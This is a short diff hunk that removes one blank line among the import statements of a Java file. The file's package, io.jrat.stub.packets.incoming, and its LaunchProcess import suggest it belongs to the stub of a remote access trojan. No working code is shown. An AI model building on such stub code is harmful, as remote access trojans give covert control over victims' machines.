@@ -2,7 +2,6 @@ package io.jrat.stub.packets.incoming;
 
 import io.jrat.stub.Connection;
 import io.jrat.stub.LaunchProcess;
-
 import java.io.PrintWriter;
 
 
